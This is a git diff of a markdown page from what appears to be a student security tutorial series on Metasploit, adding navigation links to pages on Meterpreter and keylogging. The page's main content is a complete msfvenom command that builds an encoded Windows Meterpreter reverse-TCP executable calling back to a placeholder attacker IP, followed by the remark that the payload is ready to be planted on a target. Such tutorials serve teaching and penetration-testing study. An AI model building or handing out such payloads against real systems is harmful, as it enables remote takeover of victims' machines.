@@ -1,5 +1,16 @@
 # Creating a payload with Msfvenom
 
+**[Home][H]**
+
+**[1 - Using Metasploit][Metasploit]**
+
+**[2 - Creating a Payload][Create]**
+
+**[3 - Using Meterpreter][Meterpreter]**
+
+**[4 - Keylogging][Keylog]**
+
+---
 To create a Meterpreter reverse shell, execute the following command
 
 **msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport[attacker port] --platform windows -e x86/shikata_ga_nai -f exe -o [name of payload executable].exe**.
@@ -18,3 +29,10 @@ Execute the following command
 Now we have a payload ready to be planted in the target system.
 
 ---
+
+
+[H]: https://github.com/yukun2h4ng/1600final/blob/main/README.md
+[Metasploit]: https://github.com/yukun2h4ng/1600final/blob/main/tutorial.md
+[Create]: https://github.com/yukun2h4ng/1600final/blob/main/createpayload.md
+[Meterpreter]: https://github.com/yukun2h4ng/1600final/blob/main/meterpreter.md
+[Keylog]: https://github.com/yukun2h4ng/1600final/blob/main/keylogging.md
